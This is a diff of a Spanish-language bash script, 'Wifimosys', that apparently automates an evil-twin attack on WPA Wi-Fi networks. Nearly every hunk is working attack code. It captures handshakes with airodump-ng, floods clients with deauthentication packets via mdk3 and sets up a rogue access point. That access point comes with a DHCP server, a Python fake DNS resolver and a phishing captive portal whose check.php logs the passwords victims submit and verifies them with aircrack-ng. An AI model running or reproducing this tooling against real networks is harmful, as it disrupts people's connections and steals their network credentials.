@@ -10,18 +10,17 @@ if [[ $EUID -ne 0 ]]; then
         echo -e "\e[1;31mDeberás ejecutar el script con privilegios de administrador."$transparent""
         exit 1
 fi
-
 clear
 
 ##################################### Configuración general del script
 
-DUMP_PATH="/tmp/Wifimosys"
-HANDSHAKE_PATH="/root/handshakes"
-PASSLOG_PATH="/root/pwlog"
-DEAUTHTIME="99"
-revision=10
+revision=11
 version=0.13
 IP=192.168.1.1
+RUTATEMP="/tmp/Wifimosys"
+RUTAHANDSHAKE="/root/handshakes"
+RUTAPASS="/root/pwlog"
+DEAUTHTIME="99"
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
 fakeapmode="hostapd"; authmode="handshake";
 
@@ -38,6 +37,8 @@ Cafe="\033[0;33m"
 Fiuscha="\033[0;35m"
 blue="\033[1;34m"
 transparent="\e[0m"
+
+CONSEGUIDO="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
 
 ##################################### Ajusta el modo normal o desarrollador
 
@@ -59,34 +60,6 @@ function airmon {
 chmod +x airmon-ng
 }
 airmon
-
-##################################### Comprueba actualizaciones (no usado por ahora)
-
-function actualizaciones {
-revision_online="$(timeout -s SIGTERM 20 curl -L "" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
-	if [ -z "$revision_online" ]; then
-		echo "Buscando actualizaciones">$DUMP_PATH/Irev
-	else
-		echo "$revision_online">$DUMP_PATH/Irev
-	fi
-}
-
-##################################### Animación (no usada por ahora)
-
-function animacion {
-
-	local pid=$1
-	local delay=0.15
-	local spinstr='|/-\'
-	while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
-		local temp=${spinstr#?}
-		printf " [%c]  " "$spinstr"
-		local spinstr=$temp${spinstr%"$temp"}
-		sleep $delay
-		printf "\b\b\b\b\b\b"
-	done
-	printf "    \b\b\b\b"
-}
 
 ##################################### Informe de error (solo en modo desarrollador)
 
@@ -173,7 +146,7 @@ function exitmode {
 	if [ $WIFIMOSYS_DEBUG != 1 ]; then
 
 		echo -e ""$white"["$red"-"$white"] "$white"Borrando "$grey"archivos"$transparent""
-		rm -R $DUMP_PATH/* &>$wifim_output_device
+		rm -R $RUTATEMP/* &>$wifim_output_device
 	fi
 
 	echo -e ""$white"["$red"-"$white"] "$white"$general_exitmode_6"$transparent""
@@ -184,14 +157,6 @@ function exitmode {
 	clear
 	exit
 }
-
-##################################### Textos tras la comprobación del password
-
-DIALOG_WEB_ERROR_ESP="<b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b>"
-DIALOG_WEB_OK_ESP="Su conexi&oacute;n se restablecer&aacute; en breves momentos."
-DIALOG_WEB_BACK_ESP="Atr&aacute;s"
-DIALOG_WEB_LENGHT_MIN_ESP="La clave debe ser superior a 7 caracteres"
-DIALOG_WEB_LENGHT_MAX_ESP="La clave debe ser inferior a 64 caracteres"
 
 ##################################### Cabecera
 
@@ -388,13 +353,13 @@ dependencias
 
 ##################################### Crea las carpetas de trabajo
 
-if [ ! -d $DUMP_PATH ]; then mkdir -p $DUMP_PATH &>$wifim_output_device
+if [ ! -d $RUTATEMP ]; then mkdir -p $RUTATEMP &>$wifim_output_device
 fi
 
-if [ ! -d $HANDSHAKE_PATH ]; then mkdir -p $HANDSHAKE_PATH &>$wifim_output_device
+if [ ! -d $RUTAHANDSHAKE ]; then mkdir -p $RUTAHANDSHAKE &>$wifim_output_device
 fi
 
-if [ ! -d $PASSLOG_PATH ]; then mkdir -p $PASSLOG_PATH &>$wifim_output_device
+if [ ! -d $RUTAPASS ]; then mkdir -p $RUTAPASS &>$wifim_output_device
 fi
 
 ##################################### Cabecera con título
@@ -525,7 +490,6 @@ function spanish {
     handshakelocation_1="Ubicación del handshake  (ejemplo: $red/root/handshakes/wifimosys.cap$transparent)"
     handshakelocation_2="Presiona ${yellow}ENTER$transparent para saltar"
     header_webinterface="Selecciona su opción"
-    header_ConnectionRESET=""$yellow"Handshake válido, iniciando el ataque..."$transparent
     general_back="Atrás"
     general_error_1="No Encontrado"
 
@@ -612,14 +576,14 @@ function setinterface {
 	vk496
 }
 
-##################################### Limpieza y preparación
+##################################### Limpieza y preparación (Función original vk496 ;)
 
 function vk496 {
 
 	conditional_clear
 	CSVDB=dump-01.csv
 
-	rm -rf $DUMP_PATH/*
+	rm -rf $RUTATEMP/*
 
 	choosescan
 	selection
@@ -669,16 +633,16 @@ function Scanchan {
 	set -- ${channel_number}
 	conditional_clear
 
-	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "$ventana_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one 
+	rm -rf $RUTATEMP/dump*
+	xterm $HOLD -title "$ventana_scanchan [$channel_number]" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $RUTATEMP/dump --channel "$channel_number" -a $WIFI_MONITOR --ignore-negative-one 
 }
 
 ##################################### Escanea toda la red con airodump-ng
 
 function Scan {
 	conditional_clear
-	rm -rf $DUMP_PATH/dump*
-	xterm $HOLD -title "$ventana_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR --ignore-negative-one 
+	rm -rf $RUTATEMP/dump*
+	xterm $HOLD -title "$ventana_scan" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $RUTATEMP/dump -a $WIFI_MONITOR --ignore-negative-one 
 }
 
 ##################################### Elegir una red del listado
@@ -688,16 +652,16 @@ function selection {
 	conditional_clear
 	top
 
-	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
+	LINEAS_WIFIS_CSV=`wc -l $RUTATEMP/$CSVDB | awk '{print $1}'`
 
 	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
 		vk496 && break
 	fi
 
-	wifionap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
+	wifionap=`cat $RUTATEMP/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 	wifionap=`expr $wifionap - 1`
-	head -n $wifionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
-	tail -n +$wifionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
+	head -n $wifionap $RUTATEMP/$CSVDB &> $RUTATEMP/dump-02.csv
+	tail -n +$wifionap $RUTATEMP/$CSVDB &> $RUTATEMP/clientes.csv
 	echo "                        LISTADO DE REDES "
 	echo ""
 	echo " ID     MAC                       CH      SEG     PWR    ESSID"
@@ -711,7 +675,7 @@ function selection {
 		if [ $longueur -ge 17 ]; then
 			i=$(($i+1))
 			POWER=`expr $POWER + 100`
-			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
+			CLIENTE=`cat $RUTATEMP/clientes.csv | grep $MAC`
 
 			if [ "$CLIENTE" != "" ]; then
 				CLIENTE="*"
@@ -728,7 +692,7 @@ function selection {
 			aprivacy[$i]=$PRIVACY
 			aspeed[$i]=$SPEED
 		fi
-	done < $DUMP_PATH/dump-02.csv
+	done < $RUTATEMP/dump-02.csv
 	echo
 	echo -e ""$green "("$white"*"$green")$selection_1"$transparent""
 	echo ""
@@ -760,33 +724,6 @@ function selection {
 	handshakelocation;
 }
 
-##################################### Desautentificaciones
-
-function askauth {
-
-	conditional_clear
-	top
-
-	while true; do
-
-		echo "$header_askauth"
-		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" $askauth_option_1"
-		echo -e "      "$blue"2)"$transparent" $askauth_option_2"
-		echo -e "      "$blue"3)"$transparent" $general_back"
-		echo "                                       "
-		echo -n "      #> "
-		read yn
-		echo ""
-		case $yn in
-			1 ) authmode="handshake"; handshakelocation; break ;;
-			2 ) authmode="wpa_supplicant"; CreaSSL; break ;;
-			3 ) askAP; break ;;
-			* ) echo "$general_case_error"; conditional_clear ;;
-		esac
-	done
-}
-
 function handshakelocation {
 
 	conditional_clear
@@ -809,7 +746,7 @@ function handshakelocation {
 				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
-						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
+						cp "$handshakeloc" $RUTATEMP/$Host_MAC-01.cap
 						CreaSSL
 					else
 					echo "Handshake corrupto"
@@ -826,7 +763,7 @@ function handshakelocation {
 						handshakelocation
 					else
 						if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
-							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
+							cp "$handshakeloc" $RUTATEMP/$Host_MAC-01.cap
 							CreaSSL
 						else
 							echo "Handshake corrupto"
@@ -908,7 +845,7 @@ function deauth {
 		;;
 		esp )
 			DEAUTH=deauthesp
-			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
+			HOST=`cat $RUTATEMP/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
 			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
 
 			if [ $LINEAS_CLIENTES -le 5 ]; then
@@ -970,8 +907,8 @@ function capture {
 
 	conditional_clear
 	if ! ps -A | grep -q airodump-ng; then
-	rm -rf $DUMP_PATH/$Host_MAC*
-	xterm $HOLD -title "CAPTURANDO HANDSHAKE" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC --channel $Host_CHAN -a $WIFI_MONITOR &
+	rm -rf $RUTATEMP/$Host_MAC*
+	xterm $HOLD -title "CAPTURANDO HANDSHAKE" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $RUTATEMP/$Host_MAC --channel $Host_CHAN -a $WIFI_MONITOR &
 	fi
 }
 
@@ -979,22 +916,22 @@ function capture {
 
 function checkhandshake {
 
-	pyrit -r $DUMP_PATH/$Host_MAC-01.cap -o $DUMP_PATH/test.cap stripLive &>$wifim_output_device
+	pyrit -r $RUTATEMP/$Host_MAC-01.cap -o $RUTATEMP/test.cap stripLive &>$wifim_output_device
 
-	if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
+	if pyrit -r $RUTATEMP/test.cap analyze 2>&1 | grep -q "good,"; then
 		killall airodump-ng mdk3 aireplay-ng &>$wifim_output_device
-		pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID.cap strip &>$wifim_output_device
+		pyrit -r $RUTATEMP/test.cap -o $RUTAHANDSHAKE/$Host_SSID.cap strip &>$wifim_output_device
 		CreaSSL
 		i=2
 		break
 	else
-		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
+		if aircrack-ng $RUTATEMP/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			Handshake_statuscheck="${yellow}Corrupto, prueba de nuevo$transparent"
 		else
 			Handshake_statuscheck="${red}No hay ningún handshake que comprobar$transparent"
 		fi
 	fi
-	rm $DUMP_PATH/test.cap &>$wifim_output_device
+	rm $RUTATEMP/test.cap &>$wifim_output_device
 }
 
 ############################################# < ATAQUE > ############################################
@@ -1003,8 +940,8 @@ function checkhandshake {
 
 function CreaSSL {
 
-       xterm -title "Creando Certificado ssl Autofirmado" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $DUMP_PATH/server.pem -out $DUMP_PATH/server.pem
-       chmod 400 $DUMP_PATH/server.pem
+       xterm -title "Creando Certificado ssl Autofirmado" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout $RUTATEMP/server.pem -out $RUTATEMP/server.pem
+       chmod 400 $RUTATEMP/server.pem
 	matartodo; ConnectionRESET; selection;
 }
 
@@ -1014,22 +951,15 @@ function ConnectionRESET {
 	top
 	infoap
 	echo
-	echo -e "$header_ConnectionRESET"
+	echo -e ""$yellow"   Handshake válido."$transparent
+	echo -e ""$yellow"   Iniciando el ataque, espera un momento..."$transparent
 	echo
-	DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ESP
-	DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ESP
-	DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ESP
-	DIALOG_WEB_OK=$DIALOG_WEB_OK_ESP
-	DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ESP
-	DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ESP
-	DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ESP
-	DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ESP
 	FAKEAP
 	preattack
 	attack
 }
 
-##################################### CREA SERVIDORES Y ARCHIVOS NECESARIOS
+##################################### PREATAQUE - SE CREAN SERVIDORES Y ARCHIVOS NECESARIOS
 
 function preattack {
 
@@ -1039,14 +969,14 @@ echo "interface=$WIFI
 driver=nl80211
 ssid=$Host_SSID
 channel=$Host_CHAN
-">$DUMP_PATH/hostapd.conf
+">$RUTATEMP/hostapd.conf
 
 ##################################### Crea la página check.php
 
 echo "<?php
 error_reporting(0);
 
-\$count_my_page = (\"$DUMP_PATH/hit.txt\");
+\$count_my_page = (\"$RUTATEMP/hit.txt\");
 \$hits = file(\$count_my_page);
 \$hits[0] ++;
 \$fp = fopen(\$count_my_page , \"w\");
@@ -1057,10 +987,10 @@ fclose(\$fp);
 
 \$key1 = @\$_POST['key1'];
 
-\$filename = \"$DUMP_PATH/data.txt\";
-\$filename2 = \"$DUMP_PATH/status.txt\";
-\$intento = \"$DUMP_PATH/intento\";
-\$attemptlog = \"$DUMP_PATH/pwattempt.txt\";
+\$filename = \"$RUTATEMP/data.txt\";
+\$filename2 = \"$RUTATEMP/status.txt\";
+\$intento = \"$RUTATEMP/intento\";
+\$attemptlog = \"$RUTATEMP/pwattempt.txt\";
 
 \$f_data= ''.\$key1.'';
 
@@ -1070,12 +1000,12 @@ fwrite(\$pwlog,\"\n\");
 fclose(\$pwlog);
 
 if ( (strlen(\$key1) < 8) ) {
-echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MIN\\\");window.history.back()</script>\";
+echo \"<script type=\\\"text/javascript\\\">alert(\\\"La clave debe ser superior a 7 caracteres\\\");window.history.back()</script>\";
 break;
 }
 
 if ( (strlen(\$key1) > 63) ) {
-echo \"<script type=\\\"text/javascript\\\">alert(\\\"$DIALOG_WEB_LENGHT_MAX\\\");window.history.back()</script>\";
+echo \"<script type=\\\"text/javascript\\\">alert(\\\"La clave debe ser inferior a 64 caracteres\\\");window.history.back()</script>\";
 break;
 }
 
@@ -1105,7 +1035,7 @@ echo \"<script type=\\\"text/javascript\\\">alert(\\\"El password no es correcto
 sleep(1);
 }
 
-?>" > $DUMP_PATH/data/check.php
+?>" > $RUTATEMP/data/check.php
 
 ##################################### Configuración del servidor DHCP
 
@@ -1119,11 +1049,11 @@ option subnet-mask 255.255.255.0;
 option domain-name-servers $IP;
 range $RANG_IP.100 $RANG_IP.250;
 }
-" >$DUMP_PATH/dhcpd.conf
+" >$RUTATEMP/dhcpd.conf
 
 ##################################### Configuración del servidor web Lighttpd
 
-echo "server.document-root = \"$DUMP_PATH/data/\"
+echo "server.document-root = \"$RUTATEMP/data/\"
 
 server.modules = (
   \"mod_access\",
@@ -1163,7 +1093,7 @@ index-file.names = ( \"index.htm\" )
 url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
 }
 
-" >$DUMP_PATH/lighttpd.conf
+" >$RUTATEMP/lighttpd.conf
 
 ##################################### Redirige las peticiones DNS (script de Francisco Santos)
 
@@ -1206,12 +1136,12 @@ if __name__ == '__main__':
       data, addr = udps.recvfrom(1024)
       p=DNSQuery(data)
       udps.sendto(p.respuesta(ip), addr)
-      print 'Request: %s -> %s' % (p.dominio, ip)
+      print 'Resolviendo: %s -> %s' % (p.dominio, ip)
   except KeyboardInterrupt:
     print 'Finalizando'
     udps.close()
-" >$DUMP_PATH/fakedns
-chmod +x $DUMP_PATH/fakedns
+" >$RUTATEMP/fakedns
+chmod +x $RUTATEMP/fakedns
 }
 
 ##################################### Prepara las tablas de enrutamiento para el servidor DHCP/WEB
@@ -1241,7 +1171,7 @@ function routear {
 
 function attack {
 
-	touch $DUMP_PATH/dhcpd.leases
+	touch $RUTATEMP/dhcpd.leases
 	interfaceroutear=$WIFI
 	handshakecheck
 	nomac=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 |head -n100 | grep -v "${mac:13:1}" | head -c 1)
@@ -1258,7 +1188,7 @@ function attack {
 	
 	if [ $fakeapmode = "hostapd" ]; then
 		killall hostapd &> $wifim_output_device
-		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "FAKE AP" -e hostapd $DUMP_PATH/hostapd.conf &
+		xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "FAKE AP" -e hostapd $RUTATEMP/hostapd.conf &
 		elif [ $fakeapmode = "airbase-ng" ]; then
 		killall airbase-ng &> $wifim_output_device
 		xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "FAKE AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
@@ -1268,26 +1198,26 @@ function attack {
 	sleep 3
 
 	killall dhcpd &> $wifim_output_device
-	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
+	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$RUTATEMP/dhcpd.leases" -cf "$RUTATEMP/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $RUTATEMP/clientes.txt" &
 	killall $(netstat -lnptu | grep ":53" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $wifim_output_device
-	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKE DNS" -e python $DUMP_PATH/fakedns &
+	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKE DNS" -e python $RUTATEMP/fakedns &
 
 	killall $(netstat -lnptu | grep ":80" | grep "LISTEN" | awk '{print $7}' | cut -d "/" -f 2) &> $wifim_output_device
-	lighttpd -f $DUMP_PATH/lighttpd.conf &> $wifim_output_device
+	lighttpd -f $RUTATEMP/lighttpd.conf &> $wifim_output_device
 	
 	killall aireplay-ng &> $wifim_output_device
 	killall mdk3 &> $wifim_output_device
-	echo "$(strings $DUMP_PATH/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	echo "$(strings $RUTATEMP/dump-02.csv | cut -d "," -f1,14 | grep -h "$Host_SSID" | cut -d "," -f1)" >$RUTATEMP/mdk3.txt
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $RUTATEMP/mdk3.txt -c $Host_CHAN &
 
-	xterm -hold $TOPRIGHT -title "ESPERANDO EL PASSWORD, TEN PACIENCIA" -e $DUMP_PATH/handcheck &
+	xterm -hold $TOPRIGHT -title "ESPERANDO EL PASSWORD, TEN PACIENCIA" -e $RUTATEMP/handcheck &
 	conditional_clear
 
 	while true; do
 	top
 	infoap
-	echo "Atacando al objetivo..."
-	echo "                                       "
+	echo -e ""$yellow"      Atacando al objetivo..."$transparent
+	echo " "
 	echo "      1) Elegir otra red"
 	echo "      2) Salir"
 	echo " "
@@ -1308,9 +1238,9 @@ function handshakecheck {
 
 	echo "#!/bin/bash
 
-	echo > $DUMP_PATH/data.txt
-	echo -n \"0\"> $DUMP_PATH/hit.txt
-	echo "" >$DUMP_PATH/loggg
+	echo > $RUTATEMP/data.txt
+	echo -n \"0\"> $RUTATEMP/hit.txt
+	echo "" >$RUTATEMP/loggg
 	tput civis
 	clear
 
@@ -1345,49 +1275,49 @@ function handshakecheck {
 	ih=\"0\"
 	else
 	ih=
-	fi">>$DUMP_PATH/handcheck
+	fi">>$RUTATEMP/handcheck
 
 	if [ $authmode = "handshake" ]; then
-		echo "if [ -f $DUMP_PATH/intento ]; then
+		echo "if [ -f $RUTATEMP/intento ]; then
 		
-		if ! aircrack-ng -w $DUMP_PATH/data.txt $DUMP_PATH/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
-		echo \"2\">$DUMP_PATH/intento
+		if ! aircrack-ng -w $RUTATEMP/data.txt $RUTATEMP/$Host_MAC-01.cap | grep -qi \"Passphrase not in\"; then
+		echo \"2\">$RUTATEMP/intento
 		break
 		else
-		echo \"1\">$DUMP_PATH/intento
+		echo \"1\">$RUTATEMP/intento
 		fi
 		
-		fi">>$DUMP_PATH/handcheck
+		fi">>$RUTATEMP/handcheck
 		
 	elif [ $authmode = "wpa_supplicant" ]; then
 		  echo "
-		wpa_passphrase $Host_SSID \$(cat $DUMP_PATH/data.txt)>$DUMP_PATH/wpa_supplicant.conf &
-		wpa_supplicant -i$WIFI -c$DUMP_PATH/wpa_supplicant.conf -f $DUMP_PATH/loggg &
+		wpa_passphrase $Host_SSID \$(cat $RUTATEMP/data.txt)>$RUTATEMP/wpa_supplicant.conf &
+		wpa_supplicant -i$WIFI -c$RUTATEMP/wpa_supplicant.conf -f $RUTATEMP/loggg &
 		
-		if [ -f $DUMP_PATH/intento ]; then
+		if [ -f $RUTATEMP/intento ]; then
 		
-		if grep -i 'WPA: Key negotiation completed' $DUMP_PATH/loggg; then
-		echo \"2\">$DUMP_PATH/intento
+		if grep -i 'WPA: Key negotiation completed' $RUTATEMP/loggg; then
+		echo \"2\">$RUTATEMP/intento
 		break
 		else
-		echo \"1\">$DUMP_PATH/intento
+		echo \"1\">$RUTATEMP/intento
 		fi
 		
 		fi
-		">>$DUMP_PATH/handcheck
+		">>$RUTATEMP/handcheck
 	fi
 
 	echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )
 
 	echo
 	echo -e \"  ATAQUE EN CURSO:\"
-	echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
-	echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
+	echo -e \"    SSID............: "$yellow"$Host_SSID"$transparent"\"
+	echo -e \"    MAC.............: "$white"$Host_MAC"$transparent"\"
 	echo -e \"    Canal...........: "$white"$Host_CHAN"$transparent"\"
-	echo -e \"    Fabricante......: "$green"$Host_MAC_MODEL"$transparent"\"
-	echo -e \"    Tiempo atacando.: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
-	echo -e \"    Intentos........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
-	echo -e \"    Clientes........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
+	echo -e \"    Fabricante......: "$white"$Host_MAC_MODEL"$transparent"\"
+	echo -e \"    Tiempo atacando.: "$white"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
+	echo -e \"    Passwords.......: "$red"\$(cat $RUTATEMP/hit.txt)" "\$(cat $RUTATEMP/data.txt)"$transparent"\"
+	echo -e \"    Clientes........: "$blue"\$(cat $RUTATEMP/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
 	echo
 	echo -e \"  CLIENTES CONECTADOS:\"
 
@@ -1397,24 +1327,24 @@ function handshakecheck {
 	  echo -e \"    "$verde"\$x) "$rojo"\$(echo \$line| cut -d \" \" -f 3) "$amarillo"\$(echo \$line| cut -d \" \" -f 5) "$verde"\$(echo \$line| cut -d \" \" -f 6)"$rescolor"\"   
 	done
 	
-	echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
+	echo -ne \"\033[K\033[u\"">>$RUTATEMP/handcheck
 	
 	
 	if [ $authmode = "handshake" ]; then
 		echo "let i=\$i+1
-		sleep 1">>$DUMP_PATH/handcheck
+		sleep 1">>$RUTATEMP/handcheck
 		
 	elif [ $authmode = "wpa_supplicant" ]; then
 		echo "sleep 5
 		
 		killall wpa_supplicant &>$wifim_output_device
 		killall wpa_passphrase &>$wifim_output_device
-		let i=\$i+5">>$DUMP_PATH/handcheck
+		let i=\$i+5">>$RUTATEMP/handcheck
 	fi
 	
 	echo "done
 	clear
-	echo \"1\" > $DUMP_PATH/status.txt
+	echo \"1\" > $RUTATEMP/status.txt
 
 	sleep 7
 
@@ -1436,21 +1366,21 @@ function handshakecheck {
 	Canal: $Host_CHAN
 	Securidad: $Host_ENC
 	Tiempo: \$ih\$horas:\$im\$minutos:\$is\$segundos
-	Password: \$(cat $DUMP_PATH/data.txt)
+	Password: \$(cat $RUTATEMP/data.txt)
 	
 	Gracias por usar Wifimosys!
-	\" >/opt/Wireless-Keys/$Host_SSID-wifimosys.txt">>$DUMP_PATH/handcheck
+	\" >/opt/Wireless-Keys/$Host_SSID-wifimosys.txt">>$RUTATEMP/handcheck
 	
 	if [ $authmode = "handshake" ]; then
-		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"      Se ha guardado en /opt/Wireless-Keys/$Host_SSID-wifimosys.txt"$rescolor"\" 
-		">>$DUMP_PATH/handcheck
+		echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $RUTATEMP/$Host_MAC-01.cap -w $RUTATEMP/data.txt && echo && echo -e \"      Se ha guardado en /opt/Wireless-Keys/$Host_SSID-wifimosys.txt"$rescolor"\" 
+		">>$RUTATEMP/handcheck
 		
 	elif [ $authmode = "wpa_supplicant" ]; then
-		echo "echo -e \"      Se ha guardado en /opt/Wireless-Keys/$Host_SSID-wifimosys.txt"$rescolor"\"">>$DUMP_PATH/handcheck
+		echo "echo -e \"      Se ha guardado en /opt/Wireless-Keys/$Host_SSID-wifimosys.txt"$rescolor"\"">>$RUTATEMP/handcheck
 	fi
 	
-	echo "kill -INT \$(ps a | grep bash| grep wifim | awk '{print \$1}') &>$wifim_output_device">>$DUMP_PATH/handcheck
-	chmod +x $DUMP_PATH/handcheck
+	echo "kill -INT \$(ps a | grep bash| grep wifim | awk '{print \$1}') &>$wifim_output_device">>$RUTATEMP/handcheck
+	chmod +x $RUTATEMP/handcheck
 }
 
 ############################################## < VARIOS > ############################################
@@ -1463,8 +1393,8 @@ function deauthall {
 }
 function deauthmdk3 {
 
-	echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando via mdk3 en $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
+	echo "$Host_MAC" >$RUTATEMP/mdk3.txt
+	xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Desautentificando via mdk3 en $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $RUTATEMP/mdk3.txt -c $Host_CHAN &
 	mdk3PID=$!
 }
 
@@ -1490,8 +1420,8 @@ function matartodo {
 ##################################### Crea el contenido del Fake AP
 function FAKEAP {
 
-	if [ ! -d $DUMP_PATH/data ]; then
-		mkdir $DUMP_PATH/data
+	if [ ! -d $RUTATEMP/data ]; then
+		mkdir $RUTATEMP/data
 	fi
 	echo "<!DOCTYPE html>
 	<html>
@@ -1512,7 +1442,7 @@ function FAKEAP {
 
 		<div data-role=\"content\">
 
-	"$DIALOG_WEB_OK"
+	"$CONSEGUIDO"
 		</div>
 
 		<div data-theme=\"a\" data-role=\"footer\" data-position=\"fixed\">
@@ -1533,7 +1463,7 @@ function FAKEAP {
 	    </div>
 	</body>
 	</html>
-	">$DUMP_PATH/data/final.html
+	">$RUTATEMP/data/final.html
 
 	echo "<!DOCTYPE html>
 <html>
@@ -1588,7 +1518,7 @@ la conexi&oacute;n</h3>
 </div>
 </body>
 </html>
-	">$DUMP_PATH/data/index.htm
+	">$RUTATEMP/data/index.htm
 }
 
 top&& setresolution && setinterface
